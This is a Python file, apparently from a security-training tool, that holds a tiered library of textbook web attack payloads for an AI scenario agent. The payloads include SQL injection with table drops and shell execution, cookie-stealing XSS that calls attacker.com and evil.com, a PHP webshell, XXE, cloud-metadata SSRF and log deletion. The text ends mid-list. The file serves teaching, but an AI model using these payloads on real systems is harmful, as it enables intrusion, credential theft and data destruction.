# FILE: backend/ai_engine/tools/payload_generator.py
# PURPOSE: Tool spec and payload library for the AI scenario agent
# SECURITY NOTE: Payloads are educational strings — never execute against real targets

TOOL_SPEC = {
    "name": "generate_payloads",
    "description": (
        "Returns a curated list of educational attack payloads for a vulnerability type, "
        "ordered from basic to advanced.\n\n"
        "WHEN TO CALL: AFTER http_probe and check_endpoint have confirmed an attack "
        "surface exists. Use payload results to populate reproduce_steps — NOT to "
        "actually send payloads to the target (use inject_probe for active testing).\n\n"
        "DECISION LOGIC:\n"
        "- Use returned payloads to write the 'How to Reproduce' section\n"
        "- Select payloads matching the difficulty level requested\n"
        "- Do NOT pass these payloads to inject_probe — inject_probe uses safe canary strings"
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "vuln_type": {
                "type": "string",
                "enum": [
                    "sql_injection",
                    "xss",
                    "csrf",
                    "file_upload",
                    "broken_auth",
                    "security_misconfig",
                    "sensitive_data_exposure",
                    "logging_monitoring",
                    "supply_chain",
                    "cryptographic_failure",
                    "insecure_design",
                    "exceptional_conditions",
                    "underprotected_apis"
                ]
            },
            "difficulty": {
                "type": "string",
                "enum": ["beginner", "intermediate", "advanced"]
            },
            "context": {
                "type": "string",
                "description": "Where the payload will be used (e.g. 'login form username field')"
            },
            "count": {
                "type": "integer",
                "minimum": 1,
                "maximum": 10
            }
        },
        "required": ["vuln_type", "difficulty", "context"]
    }
}

PAYLOADS = {

    # ── SQL Injection ──────────────────────────────────────────────────────────
    "sql_injection": {
        "beginner": [
            {"payload": "' OR '1'='1",
             "description": "Classic auth bypass",
             "expected": "Login as the first user in DB without a password"},
            {"payload": "' OR '1'='1' --",
             "description": "Auth bypass with SQL comment",
             "expected": "Password check skipped entirely"},
            {"payload": "admin'--",
             "description": "Target admin account directly",
             "expected": "Login as admin with no password"},
            {"payload": "' OR 1=1--",
             "description": "Numeric always-true auth bypass",
             "expected": "Bypasses login; first row returned"},
            {"payload": "' OR 'x'='x",
             "description": "String always-true variant",
             "expected": "Evaluates to TRUE — auth bypassed"},
        ],
        "intermediate": [
            {"payload": "' UNION SELECT null,username,password FROM users--",
             "description": "UNION-based data extraction",
             "expected": "Dump all usernames and password hashes"},
            {"payload": "1' AND SLEEP(5)--",
             "description": "Time-based blind SQLi",
             "expected": "5-second delay confirms vulnerability"},
            {"payload": "'; INSERT INTO users(username,password_plain,role) VALUES('hacker','hacked','admin')--",
             "description": "Second-order SQL injection — store then execute",
             "expected": "Payload stored in DB; executed when admin loads user list"},
            {"payload": "' AND LOAD_FILE('/etc/passwd')--",
             "description": "Out-of-band SQLi via file read (MySQL)",
             "expected": "Contents of /etc/passwd returned in response"},
            {"payload": "'; EXEC xp_cmdshell('whoami')--",
             "description": "Stored procedure abuse (MSSQL xp_cmdshell)",
             "expected": "OS command executed server-side; output returned"},
            {"payload": '{"$gt": ""}',
             "description": "NoSQL injection — MongoDB always-true comparison",
             "expected": "All documents returned; auth bypassed in MongoDB"},
            {"payload": '{"$where": "1==1"}',
             "description": "NoSQL injection — MongoDB $where code execution",
             "expected": "JavaScript executed server-side in MongoDB context"},
            {"payload": "' AND 1=1-- injected via X-Forwarded-For: 127.0.0.1",
             "description": "HTTP header injection — SQLi via X-Forwarded-For",
             "expected": "Header value interpolated into SQL query without sanitisation"},
        ],
        "advanced": [
            {"payload": "'; DROP TABLE users;--",
             "description": "Destructive DDL injection",
             "expected": "Destroys the users table"},
            {"payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
             "description": "Error-based table enumeration",
             "expected": "Reveals table names via DB error message"},
            {"payload": "' UNION SELECT null, UTL_HTTP.REQUEST('http://attacker.com/?data='||user||'') FROM dual--",
             "description": "Out-of-band SQLi via DNS/HTTP lookup (Oracle UTL_HTTP)",
             "expected": "DB credentials exfiltrated to attacker-controlled server"},
            {"payload": "GET /api/search?filter={\"name\":{\"$regex\":\"^admin\"}}",
             "description": "JSON-based NoSQL injection via query parameter",
             "expected": "Regex leaks data character-by-character via boolean response"},
            {"payload": "User-Agent: ' OR 1=1--  (injected in HTTP header logged to DB)",
             "description": "User-Agent header SQLi — value stored then queried",
             "expected": "Auth bypass or data extraction via logged header value"},
        ]
    },

    # ── Cross-Site Scripting ───────────────────────────────────────────────────
    "xss": {
        "beginner": [
            {"payload": "<script>alert('XSS')</script>",
             "description": "Basic script injection",
             "expected": "Alert box appears in browser"},
            {"payload": "<img src=x onerror=alert(1)>",
             "description": "Image error handler",
             "expected": "Alert triggers via broken image load"},
            {"payload": "<svg onload=alert(document.cookie)>",
             "description": "SVG onload event",
             "expected": "Session cookie exposed in alert"},
            {"payload": "<ScRiPt>alert(1)</ScRiPt>",
             "description": "Mixed-case XSS filter bypass",
             "expected": "Naive case-sensitive filter bypassed; script executes"},
            {"payload": "<img src=\"x\" onerror=\"&#97;lert(1)\">",
             "description": "HTML entity-encoded XSS bypass",
             "expected": "HTML entities decoded by browser before execution"},
            {"payload": "<details/open/ontoggle=alert(1)>",
             "description": "HTML5 details element event handler",
             "expected": "Alert fires when details element auto-opens"},
        ],
        "intermediate": [
            {"payload": "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
             "description": "Cookie exfiltration",
             "expected": "Session cookie silently sent to attacker server"},
            {"payload": "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>",
             "description": "Page defacement",
             "expected": "Entire page content replaced"},
            {"payload": "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>",
             "description": "Context-breaking XSS — escapes multiple contexts",
             "expected": "Breaks out of title/style/textarea/script context and executes"},
            {"payload": "<svg><script>alert(1)</script></svg>  (uploaded as .svg file)",
             "description": "XSS via SVG file upload",
             "expected": "Script executes when victim browses to uploaded SVG URL"},
            {"payload": "User-Agent: <script>alert(1)</script>  (reflected in admin log viewer)",
             "description": "XSS via reflected HTTP header (User-Agent / Referer)",
             "expected": "Admin's browser executes script when viewing request logs"},
            {"payload": "<div id=x tabindex=1 onfocus=alert(1) style=display:block></div>",
             "description": "DOM-based XSS via innerHTML assignment",
             "expected": "Script executes when DOM is mutated via innerHTML"},
        ],
        "advanced": [
            {"payload": "<script>new Image().src='//evil.com/log?k='+encodeURIComponent(document.cookie)</script>",
             "description": "Pixel-based exfiltration (bypasses some CSP)",
             "expected": "Cookie sent via image request, harder to detect"},
            {"payload": "window.addEventListener('message',function(e){eval(e.data)})",
             "description": "XSS via postMessage without origin check",
             "expected": "Attacker iframe sends malicious message; target page evaluates it"},
            {"payload": "<div style=\"background:url('javascript:alert(1)')\">",
             "description": "CSS injection via style attribute (expression bypass)",
             "expected": "JavaScript executes via CSS url() in older browsers"},
            {"payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
             "description": "Mutation XSS (mXSS) via innerHTML sanitizer bypass",
             "expected": "Sanitizer passes payload; browser re-parses and executes script"},
        ]
    },

    # ── CSRF ────────────────────────────────────────────────────────────────────
    "csrf": {
        "beginner": [
            {"payload": '<form action="http://target/change-password" method="POST">'
                        '<input name="password" value="hacked123">'
                        '</form><script>document.forms[0].submit()</script>',
             "description": "Auto-submitting CSRF form on attacker page",
             "expected": "Victim's password changed silently when they visit attacker page"},
            {"payload": '<img src="http://target/transfer?to=attacker&amount=1000">',
             "description": "GET-based CSRF via image tag",
             "expected": "Fund transfer triggered just by loading attacker's image"},
            {"payload": '<form action="http://target/login" method="POST">'
                        '<input name="username" value="attacker"><input name="password" value="known">'
                        '</form><script>document.forms[0].submit()</script>',
             "description": "Login CSRF — force victim to authenticate as attacker",
             "expected": "Victim unknowingly logged in as attacker; attacker sees victim activity"},
            {"payload": '<img src="http://target/logout">',
             "description": "Logout CSRF — force victim session termination",
             "expected": "Victim logged out; attacker times session takeover"},
        ],
        "intermediate": [
            {"payload": "XMLHttpRequest cross-origin POST with victim's active session cookies",
             "description": "AJAX-based CSRF",
             "expected": "Admin action performed under victim's identity"},
            {"payload": 'fetch("http://target/api/transfer", {method:"POST",'
                        'headers:{"Content-Type":"text/plain"},'
                        'body:\'{"to":"attacker","amount":1000}\',credentials:"include"})',
             "description": "CSRF via JSON body with text/plain Content-Type bypass",
             "expected": "Server accepts JSON body sent as text/plain; CORS preflight skipped"},
            {"payload": "Observe Referer header sent with form submission containing CSRF token in URL",
             "description": "CSRF token leak via Referer header",
             "expected": "Token extracted from Referer by attacker-controlled linked page"},
            {"payload": "Origin: https://attacker.com → Access-Control-Allow-Origin: * returned",
             "description": "CSRF via CORS misconfiguration — wildcard origin",
             "expected": "Attacker reads cross-origin response; combines with CSRF for data theft"},
        ],
        "advanced": [
            {"payload": "POST /api/action with Content-Type: application/json, no CSRF token, "
                        "server relies only on Content-Type for protection",
             "description": "JSON CSRF bypass (server trusts Content-Type header alone)",
             "expected": "Simple form can't send JSON, but fetch() with credentials can"},
            {"payload": "Load crossdomain.xml: <allow-access-from domain=\"*\"/>",
             "description": "CSRF via Flash crossdomain.xml wildcard (legacy educational)",
             "expected": "Flash SWF on attacker domain reads cross-origin responses"},
        ]
    },

    # ── File Upload ─────────────────────────────────────────────────────────────
    "file_upload": {
        "beginner": [
            {"payload": "shell.php containing: <?php system($_GET['cmd']); ?>",
             "description": "Basic PHP webshell upload",
             "expected": "Execute OS commands via URL: /uploads/shell.php?cmd=id"},
            {"payload": "evil.php renamed to evil.php.jpg",
             "description": "Double extension bypass",
             "expected": "Bypass naive extension filter, file saved as executable"},
            {"payload": "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
             "description": "SVG upload with embedded XSS script",
             "expected": "Stored XSS executes when victim views the SVG at its URL"},
            {"payload": "file.csv containing: =CMD|'/C calc'!A0 in first cell",
             "description": "CSV injection (formula injection)",
             "expected": "Spreadsheet application executes formula when user opens CSV"},
        ],
        "intermediate": [
            {"payload": "GIF89a<?php system($_GET['cmd']); ?>",
             "description": "GIF magic bytes + PHP payload (polyglot file)",
             "expected": "Passes MIME-type check but executes as PHP"},
            {"payload": "shell.phtml / shell.php5 / shell.phar",
             "description": "Alternative PHP extensions",
             "expected": "Bypass .php extension blacklist"},
            {"payload": "zip archive containing ../../etc/passwd as entry path (Zip Slip)",
             "description": "ZIP path traversal — Zip Slip attack",
             "expected": "Archive extraction writes to arbitrary path outside upload dir"},
            {"payload": "JPEG with PHP webshell injected in EXIF Comment field",
             "description": "Polyglot image — PHP in EXIF metadata",
             "expected": "Passes image content check; executed by PHP if accessed directly"},
            {"payload": "upload.html containing <meta http-equiv=refresh> to phishing clone",
             "description": "HTML file upload leading to phishing page",
             "expected": "Victim directed to credential-harvesting page hosted on trusted domain"},
            {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                        '<foo>&xxe;</foo>',
             "description": "XML upload with XXE (XML External Entity) payload",
             "expected": "Server parses XML and includes /etc/passwd in response"},
        ],
        "advanced": [
            {"payload": "SVG file containing <script> tag",
             "description": "SVG XSS via file upload",
             "expected": "Stored XSS triggered when victim views uploaded SVG"},
            {"payload": "PDF file with embedded /JavaScript action: app.alert('XSS')",
             "description": "PDF with embedded JavaScript action",
             "expected": "JavaScript executes when PDF opened in browser plugin"},
            {"payload": "Upload 1GB file (or Content-Length: 1073741824 with chunked body)",
             "description": "Large file upload — Denial of Service via storage exhaustion",
             "expected": "Server disk full; application unavailable for other users"},
            {"payload": "shell.php%00.jpg  (null byte in filename)",
             "description": "Null byte injection in filename",
             "expected": "Server truncates at null byte — saves as shell.php despite .jpg check"},
        ]
    },

    # ── Broken Authentication ───────────────────────────────────────────────────
    "broken_auth": {
        "beginner": [
            {"payload": "admin / admin  (or admin / password)",
             "description": "Default credentials not changed",
             "expected": "Immediate login to admin account"},
            {"payload": "Brute force with rockyou.txt (no rate limiting)",
             "description": "No login attempt limit",
             "expected": "Correct password found after N attempts without lockout"},
            {"payload": "Submit password reset, receive token, use it twice",
             "description": "Password reset token not invalidated after first use",
             "expected": "Old token still works — account takeover via email interception"},
            {"payload": "Login simultaneously from 10 different IPs with same account",
             "description": "No concurrent session limit",
             "expected": "All 10 sessions active simultaneously — shared credential risk"},
        ],
        "intermediate": [
            {"payload": "Reuse captured session token after user logs out",
             "description": "Session not invalidated on logout",
             "expected": "Attacker can still authenticate with old token"},
            {"payload": "Credential stuffing: leaked username:password list from other breach",
             "description": "Password reuse across services",
             "expected": "Accounts with reused passwords compromised"},
            {"payload": "Measure response time: 'User not found' vs 'Wrong password' (50ms difference)",
             "description": "Username enumeration via response timing difference",
             "expected": "Valid usernames identified by slower response (DB lookup performed)"},
            {"payload": "Error message reveals: 'Password incorrect for user admin' vs 'User not found'",
             "description": "Username enumeration via distinct error messages",
             "expected": "Attacker enumerates valid usernames before brute-forcing passwords"},
            {"payload": "Intercept 2FA response, change {\"success\":false} to {\"success\":true}",
             "description": "2FA bypass via response manipulation",
             "expected": "Client-side 2FA check bypassed; server trusts manipulated response"},
            {"payload": "Rotate X-Forwarded-For: 1.2.3.X (increment X) on each login attempt",
             "description": "Account lockout bypass via IP rotation header",
             "expected": "Server uses X-Forwarded-For for rate limiting; bypass with each new IP"},
        ],
        "advanced": [
            {"payload": "Tamper JWT payload: change role from 'user' to 'admin', re-sign with 'none' algorithm",
             "description": "JWT algorithm confusion (none alg attack)",
             "expected": "Admin access granted without valid signature"},
            {"payload": "GET /oauth/authorize?redirect_uri=https://attacker.com/callback",
             "description": "OAuth token hijacking via redirect_uri manipulation",
             "expected": "Authorization code redirected to attacker; access token obtained"},
            {"payload": "Extract 'remember_me' cookie — observe it never expires",
             "description": "Remember-me token with no expiry",
             "expected": "Stolen cookie grants indefinite access without re-authentication"},
        ]
    },

    # ── Security Misconfiguration ───────────────────────────────────────────────
    "security_misconfig": {
        "beginner": [
            {"payload": "GET /.env",
             "description": "Exposed environment file",
             "expected": "DB credentials, API keys, SECRET_KEY all exposed"},
            {"payload": "GET /.git/config",
             "description": "Exposed git repository config",
             "expected": "Remote repo URL and potentially credentials visible"},
            {"payload": "GET /admin/ with a regular user account",
             "description": "Missing access control on admin panel",
             "expected": "Full admin dashboard accessible without admin role"},
            {"payload": "GET /index.php.bak  or  GET /web.config.old  or  GET /database.sql",
             "description": "Backup files exposed on webserver",
             "expected": "Source code, config, or full DB dump downloadable"},
            {"payload": "OPTIONS / HTTP/1.1  (check Allow: header in response)",
             "description": "Dangerous HTTP methods enabled (TRACE, PUT, DELETE)",
             "expected": "TRACE reflects cookies (XST); PUT/DELETE allow direct resource manipulation"},
        ],
        "intermediate": [
            {"payload": "GET /phpmyadmin/  (or /adminer.php)",
             "description": "DB admin tool exposed to internet",
             "expected": "Direct database access without app-layer auth"},
            {"payload": "Error page stack trace: trigger 500 with invalid input",
             "description": "Verbose error messages enabled in production",
             "expected": "Framework version, file paths, DB schema revealed"},
            {"payload": "GET /jenkins  or  GET /kibana  or  GET /_cat/indices (Elasticsearch)",
             "description": "Internal admin interfaces exposed without authentication",
             "expected": "Full administrative access to CI/CD, logging, or search infrastructure"},
            {"payload": "curl -I https://target.com  — observe Server: Apache/2.4.1 in response",
             "description": "Server version disclosed in Server response header",
             "expected": "Attacker identifies exact version; cross-references known CVEs"},
            {"payload": "GET /uploads/  (observe directory listing)",
             "description": "Directory listing enabled — exposes all uploaded files",
             "expected": "Full list of uploaded files browsable; sensitive documents downloadable"},
            {"payload": "Load page in iframe: <iframe src='https://target.com/admin'>",
             "description": "Clickjacking — missing X-Frame-Options or CSP frame-ancestors",
             "expected": "Page loads in attacker-controlled iframe; UI redressing attack possible"},
            {"payload": "curl -H 'Origin: https://evil.com' https://target.com/api/data  — observe CORS headers",
             "description": "CORS wildcard — Access-Control-Allow-Origin: * on sensitive endpoint",
             "expected": "Any origin can read API response; credential data exposed cross-origin"},
        ],
        "advanced": [
            {"payload": "Directory traversal: GET /static/../../../../etc/passwd",
             "description": "Path traversal due to misconfigured static file serving",
             "expected": "System file contents returned"},
            {"payload": "GET /api/users  (missing Cache-Control: no-store on authenticated endpoint)",
             "description": "Sensitive response cached by proxy/browser",
             "expected": "Another user on same machine/proxy retrieves previous user's data from cache"},
            {"payload": "curl -H 'X-Content-Type: text/html' /api/upload  — missing X-Content-Type-Options: nosniff",
             "description": "MIME sniffing — browser executes uploaded file as wrong type",
             "expected": "Text file executed as HTML/script when served without nosniff header"},
        ]
    },

    # ── Sensitive Data Exposure ─────────────────────────────────────────────────
    "sensitive_data_exposure": {
        "beginner": [
            {"payload": "Intercept HTTP (non-HTTPS) login form with Wireshark / mitmproxy",
             "description": "Credentials transmitted in plaintext",
             "expected": "Username and password captured in clear text on network"},
            {"payload": "SELECT password FROM users — observe plain text storage",
             "description": "Passwords stored without hashing",
             "expected": "All user passwords immediately readable from DB dump"},
            {"payload": "GET /api/user/me  — response contains full SSN and credit card number",
             "description": "PII over-exposed in API response",
             "expected": "Full 16-digit card number, SSN, DOB returned unnecessarily"},
            {"payload": "GET /api/login?username=admin&password=secret123  (credentials in URL)",
             "description": "Sensitive data in URL query parameters",
             "expected": "Credentials appear in browser history, server logs, and Referer headers"},
        ],
        "intermediate": [
            {"payload": "Access old database backup: GET /backup/db_2023.sql",
             "description": "Unprotected backup files",
             "expected": "Full database with all user credentials downloaded"},
            {"payload": "Check API response for over-exposed fields (SSN, full card number)",
             "description": "API returning more fields than needed",
             "expected": "Sensitive PII returned in JSON response unnecessarily"},
            {"payload": "Inspect HTML source: <!-- TODO: remove password=admin123 from test code -->",
             "description": "Sensitive data in HTML comments",
             "expected": "Hardcoded credentials visible in page source to any visitor"},
            {"payload": "View Set-Cookie header: missing Secure, HttpOnly, SameSite=Strict flags",
             "description": "Insecure cookie attributes",
             "expected": "Cookie accessible via JS (no HttpOnly); sent over HTTP (no Secure); CSRF risk (no SameSite)"},
            {"payload": "Open DevTools > Application > Local Storage: JWT token stored as plain string",
             "description": "Sensitive token stored in localStorage (XSS-accessible)",
             "expected": "Any XSS payload on the same origin can steal the token"},
        ],
        "advanced": [
            {"payload": "Intercept response: credit card shown as 4111111111111111 (not 411111******1111)",
             "description": "Credit card number not masked in API response",
             "expected": "Full PAN exposed; violates PCI-DSS requirement 3.4"},
            {"payload": "Check server logs: POST /login body includes password=admin123 in plaintext log",
             "description": "Password logged in plaintext in application logs",
             "expected": "Log access = credential access; persists long after session ends"},
            {"payload": "Inspect <input type=password autocomplete=on> in login form HTML",
             "description": "Autocomplete enabled on password field",
             "expected": "Browser offers to save and auto-fill password; shared computer risk"},
        ]
    },

    # ── Logging & Monitoring ────────────────────────────────────────────────────
    "logging_monitoring": {
        "beginner": [
            {"payload": "Perform 100 failed logins — observe: no alert, no lockout, no log entry",
             "description": "No brute force detection or alerting",
             "expected": "Attack proceeds undetected; no incident created"},
            {"payload": "SQLi payload in login — check: does log record the raw payload?",
             "description": "Logs don't capture attack payloads",
             "expected": "Attack leaves no forensic trail for incident response"},
            {"payload": "Perform successful brute force — check if success logged with attacker IP",
             "description": "Successful brute force not logged",
             "expected": "Attacker's successful login indistinguishable from legitimate login"},
            {"payload": "GET /logs  or  GET /debug  or  GET /.well-known/security.txt",
             "description": "Log files publicly accessible",
             "expected": "Raw application logs exposed; internal IPs, stack traces, user data visible"},
        ],
        "intermediate": [
            {"payload": "Delete or modify log file: rm /var/log/app/access.log",
             "description": "Logs stored without integrity protection",
             "expected": "Attacker can erase evidence of intrusion"},
            {"payload": "Perform admin action (delete user) — no audit trail of who did it or when",
             "description": "Admin actions not audited",
             "expected": "Insider threat or compromised admin account untraceable"},
            {"payload": "Inject newline in username: 'admin\\n[2024-01-01 INFO] Legitimate user logged in'",
             "description": "Log injection via newline characters in user input",
             "expected": "Attacker inserts fake log entries; forensic analysis corrupted"},
            {"payload": "Trigger 500 error — check if full stack trace returned to user in response body",
             "description": "Verbose error messages with stack traces returned to users",
             "expected": "Framework version, file paths, DB schema, internal IPs exposed"},
        ],
        "advanced": [
            {"payload": "Perform sequence of actions with no correlation-ID — support cannot trace request chain",
             "description": "No correlation ID / distributed request tracing",
             "expected": "Multi-service attacks undetectable; incident response impossible"},
        ]
    },

    # ── Supply Chain ────────────────────────────────────────────────────────────
    "supply_chain": {
        "beginner": [
            {"payload": "npm install malicious-package (typosquatting: 'lodahs' vs 'lodash')",
             "description": "Typosquatted package on npm",
             "expected": "Malicious code installed alongside app dependencies"},
            {"payload": "pip install colourama  (vs 'colorama')",
             "description": "Typosquatted PyPI package",
             "expected": "Credential-stealing code injected into Python environment"},
            {"payload": "<script src='https://cdn.example.com/lib.js'> (no integrity= attribute)",
             "description": "CDN resource loaded without Subresource Integrity (SRI) hash",
             "expected": "If CDN compromised, malicious script served with no detection"},
        ],
        "intermediate": [
            {"payload": "Use outdated library with known CVE (e.g. requests < 2.20.0 — CVE-2018-18074)",
             "description": "Dependency with published CVE",
             "expected": "Vulnerability inherited from unmaintained dependency"},
            {"payload": "pip-audit / npm audit — check for transitive dependencies with critical CVEs",
             "description": "Transitive dependency vulnerability",
             "expected": "Vulnerable code included via indirect dependency; often overlooked"},
            {"payload": "Publish package 'mycompany-internal-lib' to npm public registry",
             "description": "Dependency confusion — internal package name resolvable from public registry",
             "expected": "npm/pip prefers public registry version; malicious package installed automatically"},
        ],
        "advanced": [
            {"payload": "CI/CD pipeline injects env var exfiltration step via compromised build script",
             "description": "Build pipeline compromise",
             "expected": "ANTHROPIC_API_KEY and DATABASE_URL exfiltrated during build"},
            {"payload": "uses: actions/checkout@main  (unpinned GitHub Action)",
             "description": "GitHub Actions using unpinned action version",
             "expected": "If action repo compromised, malicious code runs in CI pipeline next build"},
        ]
    },

    # ── Cryptographic Failures ──────────────────────────────────────────────────
    "cryptographic_failure": {
        "beginner": [
            {"payload": "Crack MD5 hash via online rainbow table: 5f4dcc3b5aa765d61d8327deb882cf99",
             "description": "Weak MD5 hash — instantly cracked",
             "expected": "Plain text 'password' recovered in under 1 second"},
            {"payload": "Connect to app over plain HTTP, intercept with mitmproxy",
             "description": "No TLS / HTTPS enforcement",
             "expected": "All data including session tokens captured in transit"},
            {"payload": "curl --tls-max 1.1 https://target.com  (TLS 1.0/1.1 accepted)",
             "description": "Outdated TLS version still enabled",
             "expected": "POODLE/BEAST downgrade attack; weaker cipher suites negotiated"},
            {"payload": "openssl s_client -connect target.com:443  — observe self-signed cert warning",
             "description": "Self-signed certificate — no CA validation",
             "expected": "No trust chain; MITM attacker presents own cert without detection"},
        ],
        "intermediate": [
            {"payload": "Decode JWT secret brute-forced with jwt_tool / hashcat (weak secret key)",
             "description": "JWT signed with weak secret ('secret', '123456')",
             "expected": "JWT forged to escalate privileges"},
            {"payload": "SSL Labs scan: server supports TLS 1.0 / SSLv3",
             "description": "Outdated TLS version enabled",
             "expected": "POODLE or BEAST downgrade attack possible"},
            {"payload": "Observe two ciphertexts for identical plaintexts are identical (ECB mode)",
             "description": "ECB mode block cipher — patterns leak through encryption",
             "expected": "Identical plaintext blocks produce identical ciphertext; pattern analysis possible"},
            {"payload": "Send JWT with alg:none header: eyJhbGciOiJub25lIn0.payload.",
             "description": "JWT with alg:none accepted by server",
             "expected": "Unsigned JWT accepted; attacker fabricates any claims without a key"},
            {"payload": "Certificate expiry check: curl -v https://target.com 2>&1 | grep 'expire date'",
             "description": "Certificate expired or hostname mismatch",
             "expected": "Browser shows security warning; users may click through; MITM window open"},
        ],
        "advanced": [
            {"payload": "Encrypt same plaintext twice with same AES-CBC key+IV — observe identical first blocks",
             "description": "IV reuse in AES-CBC — identical IVs leak plaintext patterns",
             "expected": "Attacker detects message reuse; known-plaintext attack becomes viable"},
            {"payload": "Math.random().toString(36) used as session token — predict next token",
             "description": "Weak PRNG (Math.random) for session token generation",
             "expected": "Tokens statistically predictable; session hijacking via brute force"},
            {"payload": "Extract hardcoded AES key from decompiled APK or published JS bundle",
             "description": "Hardcoded encryption key in source or compiled artifact",
             "expected": "Any user can decrypt all other users' encrypted data"},
        ]
    },

    # ── Insecure Design ─────────────────────────────────────────────────────────
    "insecure_design": {
        "beginner": [
            {"payload": "Password reset: answer security question 'mother's maiden name' using public LinkedIn data",
             "description": "Guessable security questions",
             "expected": "Account takeover using publicly available personal info"},
            {"payload": "Enumerate user IDs: GET /api/users/1, /2, /3 with regular user token",
             "description": "No object-level authorization check (IDOR)",
             "expected": "All user profiles accessible without ownership check"},
            {"payload": "GET /api/files/1  (as user 2) — returns user 1's private file",
             "description": "IDOR on file download endpoint",
             "expected": "Any authenticated user retrieves any other user's private files"},
            {"payload": "GET /admin/dashboard  (as regular user, no admin role check)",
             "description": "Forced browsing — missing role verification on admin routes",
             "expected": "Admin panel accessible to all authenticated users"},
        ],
        "intermediate": [
            {"payload": "Abuse coupon logic: apply same promo code 100 times in parallel (race condition)",
             "description": "Business logic flaw — no idempotency check",
             "expected": "Discount applied multiple times due to race condition"},
            {"payload": "GET /api/orders/1, /2, /3 as user B — sees user A's order details",
             "description": "Horizontal privilege escalation — access other users' resources",
             "expected": "All orders accessible regardless of ownership; BOLA vulnerability"},
            {"payload": "PATCH /api/profile with {\"role\":\"admin\"} in request body",
             "description": "Mass assignment — role field accepted from user input",
             "expected": "Own account escalated to admin via overly permissive model binding"},
            {"payload": "POST /api/purchase with {\"price\": -99.99, \"quantity\": 1}",
             "description": "Business logic: negative price accepted",
             "expected": "Account credited instead of debited; free products obtained"},
        ],
        "advanced": [
            {"payload": "PATCH /api/profile with role=admin&role=user (parameter pollution)",
             "description": "API parameter pollution — send role twice",
             "expected": "Server uses first or last value; role escalation if first=admin processed"},
            {"payload": "POST /transfer {amount: 999999} while balance is 10 (race condition — 10 parallel)",
             "description": "Business logic: transfer more than balance via race condition",
             "expected": "Concurrent transfers each pass balance check before commit; negative balance"},
            {"payload": "GET /api/users/2 as user id=3 — access other user profile then POST to /api/orders/2",
             "description": "Vertical privilege escalation via role param manipulation in request",
             "expected": "Regular user gains admin-level access by manipulating role in request body"},
        ]
    },

    # ── Exceptional Conditions ──────────────────────────────────────────────────
    "exceptional_conditions": {
        "beginner": [
            {"payload": "Submit 100,000-character string in comment field",
             "description": "No input length validation",
             "expected": "Server 500 error leaks stack trace with internal paths"},
            {"payload": "Send malformed JSON: {username: } to /api/login",
             "description": "No input format validation",
             "expected": "Unhandled exception reveals framework details"},
            {"payload": '{"quantity": -1, "price": 999999999}',
             "description": "Integer overflow / negative value in numeric field",
             "expected": "Negative quantity accepted; cart total becomes negative; free credit"},
            {"payload": '{"age": "drop table users"}  (string where integer expected)',
             "description": "Type confusion — string sent for integer field",
             "expected": "Unhandled type coercion causes exception or unexpected DB query"},
        ],
        "intermediate": [
            {"payload": "Send concurrent transfer requests (race condition): POST /transfer x 10 simultaneously",
             "description": "Missing transaction atomicity / mutex lock",
             "expected": "Balance debited once but credited multiple times (or vice versa)"},
            {"payload": "Upload file, then immediately DELETE it mid-processing (TOCTOU attack)",
             "description": "Time-of-check to time-of-use race",
             "expected": "Processing continues on deleted file path, causing undefined behavior"},
            {"payload": "target_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "description": "SSRF — AWS instance metadata endpoint",
             "expected": "Cloud IAM credentials (access key, secret, token) returned to attacker"},
            {"payload": "target_url=http://localhost:5432  or  http://192.168.1.1:22",
             "description": "SSRF — internal network port scan via server-side request",
             "expected": "Internal service responses confirm open ports on private network"},
            {"payload": "../../../../../../etc/passwd  in filename or path parameter",
             "description": "Path traversal in file/path parameter",
             "expected": "System files read outside intended directory boundary"},
        ],
        "advanced": [
            {"payload": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">...]><lolz>&lol30;</lolz>',
             "description": "XML bomb / Billion Laughs DoS",
             "expected": "XML parser expands exponentially — memory exhaustion, server crash"},
            {"payload": "POST /api/validate?email=user@(((((((((.com  (catastrophic backtracking)",
             "description": "ReDoS — crafted regex-triggering string to email/URL validator",
             "expected": "Regex engine spins for seconds/minutes; server thread blocked"},
            {"payload": '{"a":{"a":{"a":{"a":...}}}}  (1000 levels deep)',
             "description": "Stack overflow via deeply nested JSON",
             "expected": "Parser stack overflows; unhandled exception or crash"},
            {"payload": "GET / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: 6  (CL.TE desync)",
             "description": "HTTP request smuggling — CL.TE desync",
             "expected": "Front-end and back-end disagree on request boundary; poison next user's request"},
            {"payload": "?redirect=https://evil.com/phishing  (open redirect)",
             "description": "Open redirect via unvalidated redirect parameter",
             "expected": "User trusts source domain URL; redirected to attacker phishing page"},
        ]
    },

    # ── Underprotected APIs ─────────────────────────────────────────────────────
    "underprotected_apis": {
        "beginner": [
            {"payload": "Call /api/admin/users without Authorization header",
             "description": "Unauthenticated API endpoint",
             "expected": "Full user list returned with no auth required"},
            {"payload": "GET /api/v1/export?format=../../../etc/passwd",
             "description": "API path traversal",
             "expected": "System files returned via export endpoint"},
            {"payload": "GET /api/users  (returns all 50,000 users, no pagination)",
             "description": "Mass data exposure — no pagination or result limits",
             "expected": "Full user database dumped in single API call"},
            {"payload": "GET /api/v1/secret  (old endpoint) — fewer security controls than /api/v2/",
             "description": "API versioning — legacy v1 endpoint still active with weaker protections",
             "expected": "Old endpoint lacks authentication or rate limiting added in v2"},
        ],
        "intermediate": [
            {"payload": "POST /api/update-role with body {role: 'admin'} as regular user",
             "description": "Missing server-side role authorization",
             "expected": "Own role escalated to admin"},
            {"payload": "Replay captured API token after expiry (server does not validate exp claim)",
             "description": "Expired token accepted",
             "expected": "Old stolen token still authenticates successfully"},
            {"payload": "POST /graphql {query: '{__schema{types{name}}}'}",
             "description": "GraphQL introspection enabled in production",
             "expected": "Full API schema exposed — attacker discovers all types, fields, and mutations"},
